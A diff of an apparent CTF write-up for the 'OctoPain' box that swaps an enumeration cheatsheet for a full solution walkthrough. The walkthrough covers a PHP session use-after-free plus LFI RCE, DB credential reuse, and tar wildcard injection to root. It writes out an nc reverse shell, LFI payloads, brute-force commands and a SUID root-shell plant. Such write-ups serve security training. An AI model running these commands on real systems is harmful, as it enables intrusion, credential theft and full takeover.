@@ -1,237 +1,235 @@
-# OctoPain — Web / Wiki Enumeration Cheatsheet
+# OctoPain — Solution Walkthrough
 
 **Event:** NexSec Final · Boot2Root Day 1 · Student Track
-**Box:** OctoPain (Linux, Easy) · `10.0.27.66` · hostname `octopus.garden`
-**Brief:** A hobby wiki ("Octopus Garden") with notes on octopuses, left running on the host.
+**Box:** OctoPain (Linux, Easy) · hostname `octopus.garden`
+**Full chain:** anonymous -> www-data -> inkling -> root
 
-> Lab / CTF use only. Replace `10.0.27.66` if your team's IP differs.
+> Set `TARGET` to your team's box IP (ours was `10.0.27.66`; it differs per team).
+> Set `LHOST` to your VPN IP (your `tun0`, e.g. `ip a show tun0`).
 
----
-
-## 0. What the scan already told us
-
-```
-22/tcp  open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.20 (Ubuntu 24.04)
-80/tcp  open  http  nginx 1.24.0 (Ubuntu)   ->  http-title: 403 Forbidden
-```
-
-Two takeaways:
-
-- **80 returns 403 on the bare IP = name-based virtual host.** nginx only serves the
-  site when the request carries `Host: octopus.garden`. This is the whole reason the
-  task says *"ensure to include hostname: octopus.garden."* Fix `/etc/hosts` first or
-  everything you do on port 80 will be a dead 403.
-- **22 is the landing spot, not the way in.** OpenSSH 9.6p1 is in range for regreSSHion
-  (CVE-2024-6387) but that race is unreliable and not the intended path on an easy box.
-  You SSH in later with creds found on the website.
-
-**Vuln shape of this box:** vhost-gated wiki on :80 → wiki-engine CVE *or* a credential
-planted in the notes → SSH in → local privesc to root.
+| Stage | Technique |
+|-------|-----------|
+| Recon | Full port scan + vhost discovery |
+| Initial access | php2shell: `session.upload_progress` UAF + LFI session include (CVE-2026-109618 / -109619) |
+| Lateral movement | DB credential leak -> password reuse -> `su inkling` |
+| Privilege escalation | tar wildcard injection via a root cron job |
 
 ---
 
-## Start here — step by step (what we actually observed)
+## Lesson that cost us hours
 
-1. **Add the hostname, then curl the apex:**
-   ```bash
-   export IP=10.0.27.66
-   echo "$IP octopus.garden" | sudo tee -a /etc/hosts
-   curl -s -I http://octopus.garden/
-   ```
-   **Observed:** still `HTTP/1.1 403 Forbidden`, `Content-Length: 162` (nginx default
-   forbidden page). The apex is forbidden *on purpose* — adding the hostname is not
-   enough. That means the real app is almost certainly on a **subdomain** (same pattern
-   as HTB "Nexus", which hid `git.nexus.htb`).
-
-2. **Don't bother with whatweb on this pwnbox** — it's a broken install
-   (`cannot load such file -- /usr/bin/lib/...`). Fingerprint with curl/nuclei instead,
-   once we can actually reach the app.
-
-3. **Fuzz for the subdomain** (this is the key step), filtering out every 403:
-   ```bash
-   ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
-     -u http://octopus.garden/ -H "Host: FUZZ.octopus.garden" -fc 403
-   # wordlist may instead be at /usr/share/seclists/Discovery/DNS/...
-   ```
-   `-fc 403` hides the forbidden noise, so anything that appears is a real vhost
-   (watch for `git`, `wiki`, `dev`, `notes`, `blog`).
-
-4. **Add the found vhost and browse it:**
-   ```bash
-   echo "$IP THATNAME.octopus.garden" | sudo tee -a /etc/hosts
-   curl -s -I http://THATNAME.octopus.garden/
-   ```
-   Then open it in Firefox and read everything. From here, follow sections 2–7 below.
-
-5. **No subdomain hit? Try a bigger list, then fall back to path fuzzing** — the app
-   might live on a `/path` of the apex instead of a subdomain:
-   ```bash
-   # bigger subdomain wordlist
-   ~/tools/ffuf -w ~/tools/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
-     -u http://octopus.garden/ -H "Host: FUZZ.octopus.garden" -fc 403
-
-   # brute directories straight on octopus.garden (app may be at a /path, not a subdomain)
-   ~/tools/ffuf -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ \
-     -u http://octopus.garden/FUZZ -fc 403
-   ```
-
-### RUN CEPAT (box lembab / lalu VPN)
-
-Box ni di-share ramai team + lalu VPN, jadi ffuf senang tersekat (`0 req/sec`).
-Guna list kecik + had thread + timeout supaya tak hang. Panggil `ffuf` terus
-(bukan `~/tools/ffuf`).
+The app runs on **port 18080**, not port 80. A default `nmap -sC -sV` only covers
+the top 1000 ports and misses it, so port 80 (a decoy that always returns 403) looks
+like the whole web surface. **Always run a full port scan first:**
 
 ```bash
-# 1) subdomain — list kecik, laju
-ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
-  -u http://octopus.garden/ -H "Host: FUZZ.octopus.garden" -fc 403 -t 20 -timeout 7
-
-# 2) directory brute kat apex — selalunya ni yang kena (app duduk kat /path)
-ffuf -w ~/tools/SecLists/Discovery/Web-Content/common.txt:FUZZ \
-  -u http://octopus.garden/FUZZ -fc 403 -t 20 -timeout 7
+nmap -p- --min-rate 1000 TARGET        # finds 22, 80, 18080
+nmap -p18080 -sC -sV TARGET
 ```
 
-Fokus (2) dulu — `common.txt` kecik (~4700 word) jadi habis cepat walau box slow.
-Cari baris `[Status: 200]` / `[Status: 301]` = folder app.
+- Port 80 -> always 403 (decoy, ignore it)
+- Port 18080 -> 403 on the bare IP, serves the wiki only with the right `Host` header
+- Port 22 -> SSH (used later with reused creds)
 
 ---
 
-## 1. Set the hostname (do this before anything else)
+## Stage 0 — Recon
+
+### Vhost discovery (on 18080, not 80)
 
 ```bash
-export IP=10.0.27.66
-echo "$IP octopus.garden" | sudo tee -a /etc/hosts
-curl -s -I http://octopus.garden/      # should now be 200, not 403
+ffuf -u http://TARGET:18080/ -H "Host: FUZZ.garden" \
+     -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fc 403
+```
+
+The wiki answers to `Host: octopus.garden`. Add it and load it:
+
+```bash
+echo "TARGET octopus.garden" | sudo tee -a /etc/hosts
+curl -s http://octopus.garden:18080/        # The Octopus Garden wiki loads
+```
+
+### phpinfo breadcrumb
+
+```
+http://octopus.garden:18080/info.php
+```
+
+Reveals the whole initial-access path:
+- PHP 8.4.x (before the 8.4.27 fix)
+- `session.upload_progress.enabled = On`
+- `session.save_path = /var/lib/php/sessions`
+
+---
+
+## Stage 1 — LFI discovery
+
+The `?view=` parameter feeds straight into `include()`:
+
+```
+http://octopus.garden:18080/?view=/etc/passwd
+```
+
+Arbitrary file include confirmed. But every classic LFI-to-RCE wrapper is blocked
+(returns "off the reef"):
+
+```
+?view=php://input            -> blocked
+?view=php://filter/...       -> blocked
+?view=data://text/plain,...  -> blocked
+?view=/var/log/nginx/...     -> blocked
+?view=/proc/self/environ     -> blocked
+```
+
+Chasing traditional LFI2RCE here is a red herring. What is **not** blocked is the
+PHP session directory:
+
+```
+?view=/var/lib/php/sessions/sess_test
+# "No such article" (file missing, but no denylist hit) -> session include is the way
 ```
 
 ---
 
-## 2. Fingerprint the wiki
+## Stage 2 — RCE via php2shell (session.upload_progress UAF)
 
-Figure out *which* wiki engine and *which* version — that decides the CVE.
+PHP's `session.upload_progress` has a heap use-after-free. During a stalled multipart
+upload the rfc1867 callback caches `zval*` pointers into the session HashTable. When
+the upload stalls past `min_freq` (1s) the session re-initialises and frees the
+HashTable, but the cached pointers stay live, so the next `FILE_DATA` chunk writes
+through stale pointers. This poisons the session file with attacker PHP that survives
+`upload_progress.cleanup`. Include the poisoned session file through the LFI to execute.
+
+**Tool:** `github.com/syrex1013/php2shell` (reference only — review before running)
 
 ```bash
-whatweb http://octopus.garden/
-curl -s http://octopus.garden/ | grep -iE 'generator|powered by|wiki|version'
-curl -s -I http://octopus.garden/      # Server / X-Powered-By headers
+git clone https://github.com/syrex1013/php2shell
+cd php2shell
 
-# common wiki fingerprints to look for in the HTML / paths:
-#   DokuWiki   -> /doku.php, "DokuWiki" meta generator, /lib/exe/
-#   MediaWiki  -> /index.php?title=, /api.php, "MediaWiki" generator
-#   PmWiki     -> ?n=Main.HomePage
-#   Wiki.js    -> /_assets/, GraphQL at /graphql
-#   TiddlyWiki -> single index.html, "tiddlywiki" in source
+# session+LFI mode: LFI param is 'view', sessions at /var/lib/php/sessions/
+python3 poc.py http://octopus.garden:18080/index.php "id" --lfi-param view
 ```
 
-Note the exact engine + version string, then:
-
-```bash
-searchsploit <engine> <version>
-# e.g. searchsploit dokuwiki ; searchsploit mediawiki 1.39
+Expected:
+```
+[+] RCE confirmed via session+LFI
+COMMAND OUTPUT: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
----
-
-## 3. Content & directory enumeration
-
-The notes themselves are the point — creds and hints get planted in wiki pages.
-
+Reverse shell (listener `nc -lvnp 9001` on your box first):
 ```bash
-# read every page: crawl the whole site
-wget -r -np -k http://octopus.garden/ -P loot_site/
-grep -riE 'pass|pwd|cred|ssh|user|login|key|todo|secret' loot_site/
-
-# directory / file brute (include the wiki's own extensions)
-gobuster dir -u http://octopus.garden/ -t 40 \
-  -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
-
-# look for the classics that leak creds/config:
-#   /.git/   /backup   /config   /.htpasswd   /data/   /conf/   robots.txt
-curl -s http://octopus.garden/robots.txt
-```
-
-If you spot a `/.git/` folder:
-
-```bash
-git clone http://octopus.garden/.git loot_git 2>/dev/null \
-  || (pip install git-dumper && git-dumper http://octopus.garden/.git loot_git)
-cd loot_git && git log -p | grep -iE 'pass|user|key'
+python3 poc.py http://octopus.garden:18080/index.php \
+  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST 9001 >/tmp/f" \
+  --lfi-param view -i
 ```
 
 ---
 
-## 4. Subdomain / vhost sweep (there may be more than one)
+## Stage 3 — www-data -> inkling (credential reuse)
+
+### 3a. Leak DB credentials
 
 ```bash
-# the apex 403s, so just filter out status 403 and keep whatever's left
-ffuf -u http://octopus.garden/ -H "Host: FUZZ.octopus.garden" \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 403
-# add any hit to /etc/hosts and enumerate it too
+cat /var/www/octopain/config/secrets.php
+# DB_USER = inkwiki  /  DB_PASS = r3ef-r3ader-only
 ```
+
+### 3b. Query the database
+
+```bash
+mysql -h127.0.0.1 -uinkwiki -p'r3ef-r3ader-only' octopain \
+  -e "SELECT skey, sval, note FROM settings;"
+```
+
+```
+maintenance_user | inkling               | ssh / shell account
+maintenance_pass | Ink1ing_Gr0tto_2025!  | TODO: stop reusing this everywhere
+backup_path      | /var/backups/octopain/| nightly dump lives here
+```
+
+### 3c. Pivot
+
+```bash
+su inkling          # password: the maintenance_pass above
+cat /home/inkling/user.txt
+```
+
+> Note: the dump listed `..._2025!` but the account actually took `Ink1ing_Gr0tto_2026!`.
+> If one fails, try the other year — the box reused the password with a year bump.
+
+**User flag obtained.**
 
 ---
 
-## 5. App-level attacks (pick based on what you found)
+## Stage 4 — inkling -> root (tar wildcard injection)
+
+### 4a. Find the cron job
 
 ```bash
-# LFI / path traversal — if a page takes ?page= / ?file= / ?n=
-curl -s "http://octopus.garden/index.php?page=../../../../etc/passwd"
-curl -s "http://octopus.garden/?file=php://filter/convert.base64-encode/resource=config"
+cat /etc/cron.d/ink-backup
+# */2 * * * * root /opt/octopain/ink-backup.sh >> /var/log/ink-backup.log 2>&1
 
-# Wiki admin login — try default / weak creds, then brute if a user is known
-#   admin:admin  admin:password  admin:<wikiname>
-hydra -l admin -P /usr/share/wordlists/rockyou.txt octopus.garden \
-  http-post-form "/login:user=^USER^&pass=^PASS^:invalid"
-
-# Authenticated wiki -> RCE: many engines allow PHP in templates/plugins once
-# you're admin. Check the engine's known "edit template / upload plugin" CVE.
+cat /opt/octopain/ink-backup.sh
+# cd /var/www/octopain && /usr/bin/tar czf ... *
 ```
+
+It runs as **root every 2 minutes**, `cd`s into `/var/www/octopain`, and runs
+`tar czf ... *`. The `*` glob expands filenames, including names that look like tar flags.
+
+### 4b. Confirm write access
+
+```bash
+id    # inkling is in the www-data group; /var/www/octopain is group-writable
+touch /var/www/octopain/testwrite && rm /var/www/octopain/testwrite
+```
+
+### 4c. Plant the payload and the flag-named files
+
+```bash
+cat > /var/www/octopain/pwn.sh << 'SHELL'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod u+s /tmp/rootbash
+SHELL
+chmod +x /var/www/octopain/pwn.sh
+
+cd /var/www/octopain
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh pwn.sh'
+```
+
+When the cron fires, the glob expands to:
+```
+tar czf ... --checkpoint=1 --checkpoint-action=exec=sh pwn.sh config public ...
+```
+tar reads those as real flags and runs `sh pwn.sh` as root at checkpoint 1.
+
+### 4d. Wait and collect
+
+```bash
+sleep 120
+ls -la /tmp/rootbash         # -rwsr-xr-x root root
+/tmp/rootbash -p             # root shell
+cat /root/root.txt
+```
+
+**Root flag obtained.**
 
 ---
 
-## 6. Turn web findings into SSH
+## Breadcrumbs summary
 
-Wiki pages often hide a username and/or password. Harvest names and try them on SSH.
-
-```bash
-# build a username list from names found in the notes
-username-anarchy -i names.txt > users.txt
-
-# spray a found/weak password across those users
-hydra -L users.txt -p '<password-from-wiki>' ssh://$IP -t 4
-
-# or a single known pair
-ssh <user>@$IP
-```
-
-After a shell:
-
-```bash
-id; sudo -l; getcap -r / 2>/dev/null
-find / -perm -4000 -type f 2>/dev/null
-# upload & run linpeas for the full privesc picture
-```
-
----
-
-## 7. Flags
-
-```bash
-cat /home/*/user.txt     # User flag  (250 pts)
-sudo cat /root/root.txt  # Root flag  (500 pts)
-```
-
-Submit on the NexSec dashboard as you find each one.
-
----
-
-## Quick checklist
-
-- [ ] `octopus.garden` added to `/etc/hosts`, port 80 now returns 200
-- [ ] wiki engine + version identified → `searchsploit`
-- [ ] every wiki page read, grepped for creds/usernames
-- [ ] dirbusted for `/.git`, `/backup`, `/config`, `robots.txt`
-- [ ] vhost sweep done
-- [ ] LFI / default-admin / upload tested
-- [ ] harvested creds tried on SSH (22)
-- [ ] user.txt + root.txt submitted
+| Location | Hint |
+|----------|------|
+| Port 80 -> 403 | decoy, keep looking (and full-scan ports) |
+| Port 18080 + wrong Host -> 403 | vhost-based filtering |
+| `info.php` | PHP 8.4 + `session.upload_progress = On` |
+| `?view=/etc/passwd` works | LFI confirmed |
+| all wrappers blocked | not LFI2RCE, think differently |
+| session path not blocked | session include is the path |
+| blue-ringed article | italicised "progress", "uploaded", "session" |
+| blue-ringed field note | inkling reuses passwords; backup mentioned |
+| about page | PHP 8.4, upload progress, cron backups, inkling has write access |
+| `/var/backups/octopain/README.txt` | points to DB `settings` table for creds |
+| `/etc/cron.d/ink-backup` | readable cron, reveals the tar wildcard |
+| `/opt/octopain/ink-backup.sh` | world-readable, shows `tar ... *` |
